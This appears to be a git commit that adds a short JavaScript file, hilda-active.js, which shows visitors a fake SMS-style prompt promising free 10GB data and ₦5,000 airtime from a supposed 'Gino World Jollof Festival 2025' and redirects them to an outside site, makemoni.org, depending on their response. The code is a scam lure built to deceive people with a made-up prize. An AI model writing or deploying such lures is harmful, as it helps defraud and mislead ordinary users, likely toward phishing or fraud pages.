210bee7b446727690459b38af9d1db39feef5124
bestplugg <nsiukpe247@gmail.com>
2025-08-24 14:40:02 +0100

    Create hilda-active.js

---
+++ hilda-active.js
@@ -0,0 +1,5 @@
+var password = 'Claim 10gb + ₦5,000'
+password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 10gb + ₦5,000 Airtime From The Gino World Jollof Festival 2025, Press Ok to activate Now ','Claim 10gb + ₦5,000');
+if (password != 'Claim 10gb + ₦5,000') {
+location.href='https://makemoni.org/hilda-baci';
+}
